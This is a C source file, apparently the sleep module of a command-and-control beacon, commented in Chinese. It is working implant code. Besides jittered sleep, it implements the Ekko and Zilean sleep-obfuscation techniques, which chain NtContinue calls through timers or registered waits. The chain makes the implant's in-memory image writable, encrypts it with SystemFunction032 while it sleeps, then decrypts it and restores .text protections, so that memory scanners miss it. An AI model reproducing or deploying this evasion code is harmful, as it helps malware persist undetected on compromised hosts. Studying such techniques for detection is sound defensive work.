#include "beacon_sleep.h"

#include "beacon_crypto.h"
#include "beacon_runtime.h"

/*
 * Sleep 模块负责普通 sleep、jitter 计算和可选的 x64 sleep 混淆。
 * RuntimeGate 用于避免 worker/BOF 等活动线程与内存加密窗口重叠。
 */

#ifndef WT_EXECUTEINTIMERTHREAD
#define WT_EXECUTEINTIMERTHREAD 0x00000020
#endif

#ifndef WT_EXECUTEINWAITTHREAD
#define WT_EXECUTEINWAITTHREAD 0x00000004
#endif

#ifndef WT_EXECUTEONLYONCE
#define WT_EXECUTEONLYONCE 0x00000008
#endif

typedef struct SleepObfRegion {
    PVOID base;
    SIZE_T size;
} SleepObfRegion;

typedef struct SleepObfImageRegions {
    SleepObfRegion image;
    SleepObfRegion text;
    DWORD restore_protect;
} SleepObfImageRegions;

/* 根据基础 sleep 和 jitter 计算本轮休眠时间 */
DWORD SleepCalculateWithJitter(const Profile* profile)
{
    INT jitter;
    INT sleep_ms;

    if (!profile || profile->sleep_ms <= 0) return 0;

    sleep_ms = profile->sleep_ms;
    jitter = profile->jitter;
    if (jitter < 0) jitter = 0;
    if (jitter > 100) jitter = 100;

    if (jitter > 0) {
        UINT32 r = CryptoRandomU32() % (UINT32)(jitter + 1);
        sleep_ms += (INT)(((INT64)r * sleep_ms) / 100);
    }

    return sleep_ms > 0 ? (DWORD)sleep_ms : 0;
}

static VOID BeaconWaitableSleep(BeaconContext* ctx, DWORD sleep_ms)
{
    HANDLE wake_event;

    if (!ctx || sleep_ms == 0) return;

    wake_event = ctx->runtime.wake_event;
    if (wake_event) {
        if (ctx->api.pfnWaitForSingleObject) {
            ctx->api.pfnWaitForSingleObject(wake_event, sleep_ms);
        } else {
            WaitForSingleObject(wake_event, sleep_ms);
        }
        return;
    }

    if (ctx->api.pfnSleep) {
        ctx->api.pfnSleep(sleep_ms);
    } else {
        Sleep(sleep_ms);
    }
}

/* sleep 混淆定时器链本身需要消耗的估算时间 */
static DWORD SleepObfEstimatedOverhead(VOID)
{
    return SLEEP_OBF_SETUP_BUDGET + SLEEP_OBF_TIMER_STAGE_COUNT * SLEEP_OBF_TIMER_STEP_MS;
}

/* 定位当前模块整体映像和 .text 区域，供后续加密/恢复保护使用 */
static BOOL SleepObfFindImageRegions(BeaconContext* ctx, SleepObfImageRegions* regions)
{
    HMODULE module;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;

    if (!ctx || !regions) return FALSE;
    ZeroMemory(regions, sizeof(*regions));

    module = (HMODULE)ctx->image_base;
    if (!module) {
        module = ctx->api.pfnGetModuleHandleW ? ctx->api.pfnGetModuleHandleW(NULL) : GetModuleHandleW(NULL);
    }
    if (!module) return FALSE;

    dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    if (nt->OptionalHeader.SizeOfImage == 0) return FALSE;

    regions->image.base = module;
    regions->image.size = (SIZE_T)nt->OptionalHeader.SizeOfImage;
    regions->text = regions->image;
    regions->restore_protect = PAGE_EXECUTE_READWRITE;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
            if (size == 0) return FALSE;
            regions->text.base = (PVOID)((BYTE*)module + sec[i].VirtualAddress);
            regions->text.size = (SIZE_T)size;
            regions->restore_protect = PAGE_EXECUTE_READ;
            break;
        }
    }
    return TRUE;
}

#ifdef _WIN64
/* 检查 Ekko 所需的动态 API 是否全部可用 */
static BOOL EkkoHasApi(BeaconContext* ctx)
{
    return ctx &&
           ctx->api.pfnVirtualProtect &&
           ctx->api.pfnCreateEventW &&
           ctx->api.pfnSetEvent &&
           ctx->api.pfnRtlCreateTimerQueue &&
           ctx->api.pfnRtlCreateTimer &&
           ctx->api.pfnRtlDeleteTimerQueue &&
           ctx->api.pfnWaitForSingleObject &&
           ctx->api.pfnOpenProcess &&
           ctx->api.pfnGetCurrentProcessId &&
           ctx->api.pfnCloseHandle &&
           ctx->api.pfnRtlCaptureContext &&
           ctx->api.pfnNtContinue &&
           ctx->api.pfnSystemFunction032;
}

/* 基于捕获到的上下文构造一次 NtContinue 调用帧 */
static VOID SleepObfPrepareContext(CONTEXT* dst, const CONTEXT* base, PVOID rip,
                                   ULONG_PTR rcx, ULONG_PTR rdx,
                                   ULONG_PTR r8, ULONG_PTR r9)
{
    *dst = *base;
    dst->Rip = (DWORD64)(ULONG_PTR)rip;
    dst->Rsp = base->Rsp - sizeof(ULONG_PTR);
    dst->Rcx = (DWORD64)rcx;
    dst->Rdx = (DWORD64)rdx;
    dst->R8 = (DWORD64)r8;
    dst->R9 = (DWORD64)r9;
}

/* 执行 Ekko sleep：加密映像、等待、解密并恢复 .text 保护 */
static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
{
    SleepObfImageRegions regions;
    BYTE key_bytes[16];
    MY_USTRING data;
    MY_USTRING key;
    CONTEXT timer_ctx;
    CONTEXT ctxs[SLEEP_OBF_TIMER_STAGE_COUNT];
    HANDLE capture_timer = NULL;
    HANDLE signal_timer = NULL;
    HANDLE timers[SLEEP_OBF_TIMER_STAGE_COUNT] = { 0 };
    HANDLE queue = NULL;
    HANDLE timer_event = NULL;
    HANDLE start_event = NULL;
    HANDLE done_event = NULL;
    HANDLE wait_handle = NULL;
    DWORD old_protect = 0;
    DWORD tmp_protect = 0;
    DWORD masked_wait_ms;
    DWORD overhead = SleepObfEstimatedOverhead();
    DWORD delay = 0;
    BOOL ok = FALSE;
    UINT i;

    if (!EkkoHasApi(ctx) || sleep_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
        return FALSE;
    }
    if (!SleepObfFindImageRegions(ctx, &regions)) {
        return FALSE;
    }
    if (!CryptoRandom(key_bytes, sizeof(key_bytes))) {
        return FALSE;
    }

    data.Length = (DWORD)regions.image.size;
    data.MaximumLength = (DWORD)regions.image.size;
    data.Buffer = regions.image.base;
    key.Length = sizeof(key_bytes);
    key.MaximumLength = sizeof(key_bytes);
    key.Buffer = key_bytes;
    masked_wait_ms = 0;

    start_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    timer_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    done_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    if (!start_event || !timer_event || !done_event ||
        ctx->api.pfnRtlCreateTimerQueue(&queue) < 0 || !queue) {
        goto cleanup;
    }
    wait_handle = ctx->api.pfnOpenProcess(SYNCHRONIZE, FALSE, ctx->api.pfnGetCurrentProcessId());
    if (!wait_handle) {
        goto cleanup;
    }

    ZeroMemory(&timer_ctx, sizeof(timer_ctx));
    timer_ctx.ContextFlags = CONTEXT_FULL;

    if (ctx->api.pfnRtlCreateTimer(queue, &capture_timer,
                                   (WAITORTIMERCALLBACK)ctx->api.pfnRtlCaptureContext,
                                   &timer_ctx,
                                   delay += SLEEP_OBF_TIMER_STEP_MS,
                                   0, WT_EXECUTEINTIMERTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnRtlCreateTimer(queue, &signal_timer,
                                   (WAITORTIMERCALLBACK)ctx->api.pfnSetEvent,
                                   timer_event,
                                   delay += SLEEP_OBF_TIMER_STEP_MS,
                                   0, WT_EXECUTEINTIMERTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnWaitForSingleObject(timer_event, 2000) != WAIT_OBJECT_0) {
        goto cleanup;
    }
    masked_wait_ms = sleep_ms + delay;

    /* 定时器链阶段：等待启动 → 改写保护 → 加密 → 休眠 → 解密 → 恢复保护 → 通知完成 */
    SleepObfPrepareContext(&ctxs[0], &timer_ctx,
                       ctx->api.pfnWaitForSingleObject,
                       (ULONG_PTR)start_event, INFINITE, 0, 0);
    SleepObfPrepareContext(&ctxs[1], &timer_ctx,
                       ctx->api.pfnVirtualProtect,
                       (ULONG_PTR)regions.image.base, (ULONG_PTR)regions.image.size, PAGE_READWRITE, (ULONG_PTR)&old_protect);
    SleepObfPrepareContext(&ctxs[2], &timer_ctx,
                       ctx->api.pfnSystemFunction032,
                       (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[3], &timer_ctx,
                       ctx->api.pfnWaitForSingleObject,
                       (ULONG_PTR)wait_handle, masked_wait_ms, 0, 0);
    SleepObfPrepareContext(&ctxs[4], &timer_ctx,
                       ctx->api.pfnSystemFunction032,
                       (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[5], &timer_ctx,
                       ctx->api.pfnVirtualProtect,
                       (ULONG_PTR)regions.text.base, (ULONG_PTR)regions.text.size, regions.restore_protect, (ULONG_PTR)&tmp_protect);
    SleepObfPrepareContext(&ctxs[6], &timer_ctx,
                       ctx->api.pfnSetEvent,
                       (ULONG_PTR)done_event, 0, 0, 0);

    for (i = 0; i < SLEEP_OBF_TIMER_STAGE_COUNT; ++i) {
        if (ctx->api.pfnRtlCreateTimer(queue, &timers[i],
                                       (WAITORTIMERCALLBACK)ctx->api.pfnNtContinue,
                                       &ctxs[i],
                                       delay += SLEEP_OBF_TIMER_STEP_MS,
                                       0, WT_EXECUTEINTIMERTHREAD) < 0) {
            goto cleanup;
        }
    }

    ctx->api.pfnSetEvent(start_event);
    ok = ctx->api.pfnWaitForSingleObject(done_event, sleep_ms + overhead + 5000) == WAIT_OBJECT_0;

cleanup:
    if (queue) {
        if (!ok && start_event) {
            ctx->api.pfnSetEvent(start_event);
        }
        ctx->api.pfnRtlDeleteTimerQueue(queue);
    }
    if (start_event) CloseHandle(start_event);
    if (timer_event) CloseHandle(timer_event);
    if (done_event) CloseHandle(done_event);
    if (wait_handle) ctx->api.pfnCloseHandle(wait_handle);
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&data, sizeof(data));
    return ok;
}

/* 检查 Zilean 所需的动态 API 是否全部可用 */
static BOOL ZileanHasApi(BeaconContext* ctx)
{
    return ctx &&
           ctx->api.pfnVirtualProtect &&
           ctx->api.pfnCreateEventW &&
           ctx->api.pfnSetEvent &&
           ctx->api.pfnRtlRegisterWait &&
           ctx->api.pfnRtlDeregisterWait &&
           ctx->api.pfnWaitForSingleObject &&
           ctx->api.pfnOpenProcess &&
           ctx->api.pfnGetCurrentProcessId &&
           ctx->api.pfnCloseHandle &&
           ctx->api.pfnRtlCaptureContext &&
           ctx->api.pfnNtContinue &&
           ctx->api.pfnSystemFunction032;
}

/* 执行 Zilean sleep：通过 RtlRegisterWait 调度 NtContinue 上下文链 */
static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
{
    SleepObfImageRegions regions;
    BYTE key_bytes[16];
    MY_USTRING data;
    MY_USTRING key;
    CONTEXT wait_ctx;
    CONTEXT ctxs[SLEEP_OBF_TIMER_STAGE_COUNT];
    HANDLE waits[SLEEP_OBF_TIMER_STAGE_COUNT + 2] = { 0 };
    HANDLE wait_event = NULL;
    HANDLE timer_event = NULL;
    HANDLE start_event = NULL;
    HANDLE done_event = NULL;
    HANDLE wait_handle = NULL;
    DWORD old_protect = 0;
    DWORD tmp_protect = 0;
    DWORD overhead = SleepObfEstimatedOverhead();
    DWORD delay = 0;
    BOOL ok = FALSE;
    UINT i;

    if (!ZileanHasApi(ctx) || sleep_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
        return FALSE;
    }
    if (!SleepObfFindImageRegions(ctx, &regions)) {
        return FALSE;
    }
    if (!CryptoRandom(key_bytes, sizeof(key_bytes))) {
        return FALSE;
    }

    data.Length = (DWORD)regions.image.size;
    data.MaximumLength = (DWORD)regions.image.size;
    data.Buffer = regions.image.base;
    key.Length = sizeof(key_bytes);
    key.MaximumLength = sizeof(key_bytes);
    key.Buffer = key_bytes;

    wait_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    start_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    timer_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    done_event = ctx->api.pfnCreateEventW(NULL, TRUE, FALSE, NULL);
    if (!wait_event || !start_event || !timer_event || !done_event) {
        goto cleanup;
    }
    wait_handle = ctx->api.pfnOpenProcess(SYNCHRONIZE, FALSE, ctx->api.pfnGetCurrentProcessId());
    if (!wait_handle) {
        goto cleanup;
    }

    ZeroMemory(&wait_ctx, sizeof(wait_ctx));
    wait_ctx.ContextFlags = CONTEXT_FULL;

    if (ctx->api.pfnRtlRegisterWait(&waits[0],
                                    wait_event,
                                    (WAITORTIMERCALLBACK)ctx->api.pfnRtlCaptureContext,
                                    &wait_ctx,
                                    delay += SLEEP_OBF_TIMER_STEP_MS,
                                    WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnRtlRegisterWait(&waits[1],
                                    wait_event,
                                    (WAITORTIMERCALLBACK)ctx->api.pfnSetEvent,
                                    timer_event,
                                    delay += SLEEP_OBF_TIMER_STEP_MS,
                                    WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD) < 0) {
        goto cleanup;
    }
    if (ctx->api.pfnWaitForSingleObject(timer_event, 2000) != WAIT_OBJECT_0) {
        goto cleanup;
    }

    /* Zilean 阶段：等待启动 → 改写保护 → 加密 → 休眠 → 解密 → 恢复保护 → 通知完成 */
    SleepObfPrepareContext(&ctxs[0], &wait_ctx,
                           ctx->api.pfnWaitForSingleObject,
                           (ULONG_PTR)start_event, INFINITE, 0, 0);
    SleepObfPrepareContext(&ctxs[1], &wait_ctx,
                           ctx->api.pfnVirtualProtect,
                           (ULONG_PTR)regions.image.base, (ULONG_PTR)regions.image.size, PAGE_READWRITE, (ULONG_PTR)&old_protect);
    SleepObfPrepareContext(&ctxs[2], &wait_ctx,
                           ctx->api.pfnSystemFunction032,
                           (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[3], &wait_ctx,
                           ctx->api.pfnWaitForSingleObject,
                           (ULONG_PTR)wait_handle, sleep_ms, 0, 0);
    SleepObfPrepareContext(&ctxs[4], &wait_ctx,
                           ctx->api.pfnSystemFunction032,
                           (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
    SleepObfPrepareContext(&ctxs[5], &wait_ctx,
                           ctx->api.pfnVirtualProtect,
                           (ULONG_PTR)regions.text.base, (ULONG_PTR)regions.text.size, regions.restore_protect, (ULONG_PTR)&tmp_protect);
    SleepObfPrepareContext(&ctxs[6], &wait_ctx,
                           ctx->api.pfnSetEvent,
                           (ULONG_PTR)done_event, 0, 0, 0);

    for (i = 0; i < SLEEP_OBF_TIMER_STAGE_COUNT; ++i) {
        if (i == 4) {
            delay += sleep_ms + SLEEP_OBF_TIMER_STEP_MS;
        } else {
            delay += SLEEP_OBF_TIMER_STEP_MS;
        }
        if (ctx->api.pfnRtlRegisterWait(&waits[i + 2],
                                        wait_event,
                                        (WAITORTIMERCALLBACK)ctx->api.pfnNtContinue,
                                        &ctxs[i],
                                        delay,
                                        WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD) < 0) {
            goto cleanup;
        }
    }

    ctx->api.pfnSetEvent(start_event);
    ok = ctx->api.pfnWaitForSingleObject(done_event, sleep_ms + overhead + 5000) == WAIT_OBJECT_0;

cleanup:
    if (!ok && start_event) {
        ctx->api.pfnSetEvent(start_event);
    }
    for (i = 0; i < sizeof(waits) / sizeof(waits[0]); ++i) {
        if (waits[i]) {
            ctx->api.pfnRtlDeregisterWait(waits[i]);
        }
    }
    if (wait_event) CloseHandle(wait_event);
    if (start_event) CloseHandle(start_event);
    if (timer_event) CloseHandle(timer_event);
    if (done_event) CloseHandle(done_event);
    if (wait_handle) ctx->api.pfnCloseHandle(wait_handle);
    SecureZeroMemory(key_bytes, sizeof(key_bytes));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&data, sizeof(data));
    return ok;
}
#endif

/* Beacon 主循环调用的休眠入口，按配置选择普通 Sleep 或 sleep 混淆技术 */
VOID BeaconSleep(BeaconContext* ctx)
{
    DWORD sleep_ms;

    if (!ctx) return;

    sleep_ms = SleepCalculateWithJitter(&ctx->profile);
    if (sleep_ms == 0) return;

#ifndef _WIN64
    BeaconWaitableSleep(ctx, sleep_ms);
    return;
#else
    ULONGLONG start;
    ULONGLONG elapsed;
    BOOL ok = FALSE;

    if (!ctx->profile.sleep_obf_enabled ||
        (ctx->profile.sleep_obf_technique != SLEEP_OBF_EKKO &&
         ctx->profile.sleep_obf_technique != SLEEP_OBF_ZILEAN) ||
        sleep_ms < SLEEP_OBF_MIN_MS ||
        sleep_ms <= SleepObfEstimatedOverhead() + SLEEP_OBF_MIN_MASK_MS) {
        BeaconWaitableSleep(ctx, sleep_ms);
        return;
    }

    if (!RuntimeSleepObfBegin(ctx)) {
        BeaconWaitableSleep(ctx, sleep_ms);
        return;
    }

    start = ctx->api.pfnGetTickCount64 ? ctx->api.pfnGetTickCount64() : GetTickCount64();
    switch (ctx->profile.sleep_obf_technique) {
    case SLEEP_OBF_EKKO:
        ok = EkkoSleep(ctx, sleep_ms);
        break;
    case SLEEP_OBF_ZILEAN:
        ok = ZileanSleep(ctx, sleep_ms);
        break;
    default:
        ok = FALSE;
        break;
    }

    if (!ok) {
        RuntimeSleepObfEnd(ctx);
        elapsed = (ctx->api.pfnGetTickCount64 ? ctx->api.pfnGetTickCount64() : GetTickCount64()) - start;
        if (elapsed < sleep_ms) {
            BeaconWaitableSleep(ctx, (DWORD)(sleep_ms - elapsed));
        }
        return;
    }
    RuntimeSleepObfEnd(ctx);
#endif
}
